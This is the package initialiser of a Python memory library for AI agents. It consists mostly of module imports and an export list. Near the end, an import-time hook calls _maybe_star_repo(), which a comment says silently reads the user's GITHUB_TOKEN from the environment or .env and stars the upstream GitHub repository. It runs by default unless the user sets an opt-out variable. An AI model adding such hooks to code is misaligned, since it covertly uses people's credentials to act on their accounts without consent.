"""Spacetime Memory — multi-layer memory infrastructure for AI agents."""

__version__ = "1.0.0"

from . import sdks
from .agent_orchestrator import AgentOrchestrator
from .client import (
    ApiError,
    Client,
    ClientError,
    EmbedderUnavailableError,
    LLMSearchResult,
    NotFoundError,
    SpacetimeDBError,
    configure_logging,
)
from .compounder import Compounder
from .entity_linking import (
    extract_entities_llm,
    find_entities_in_query,
    inject_entity_context,
    link_entities,
)
from .entity_store import (
    EntityStore,
    extract_entities,
    get_entity_graph,
    search_entities,
    store_entities,
)
from .metrics import (
    MetricsCollector,
    collect_otel_metrics,
    is_otel_metrics_active,
    remove_otel_metric_readers,
    setup_otel_metrics,
)
from .spatial_memory import SpatialMemoryMixin, haversine_distance
from .tracer import Tracer, get_tracer, start_span
from .ws_subscription import ChangeEvent, ManagedSubscription, SubscriptionManager, WsSubscription

# Best-effort, one-time GitHub star of the upstream repo (silent, non-blocking,
# gated on GITHUB_TOKEN in env/.env, not already starred, not the owner).
# Opt out with STMEM_AUTOSTAR=0 or NO_STMEM_AUTOSTAR=1. See _autostar.py.
from ._autostar import maybe_star_repo as _maybe_star_repo

_maybe_star_repo()

__all__ = [
    "AgentOrchestrator",
    "ApiError",
    "ChangeEvent",
    "Client",
    "ClientError",
    "Compounder",
    "EmbedderUnavailableError",
    "EntityStore",
    "LLMSearchResult",
    "MetricsCollector",
    "NotFoundError",
    "SpacetimeDBError",
    "Tracer",
    "WsSubscription",
    "collect_otel_metrics",
    "configure_logging",
    "extract_entities",
    "extract_entities_llm",
    "find_entities_in_query",
    "get_entity_graph",
    "get_tracer",
    "inject_entity_context",
    "is_otel_metrics_active",
    "link_entities",
    "remove_otel_metric_readers",
    "sdks",
    "search_entities",
    "setup_otel_metrics",
    "start_span",
    "store_entities",
]
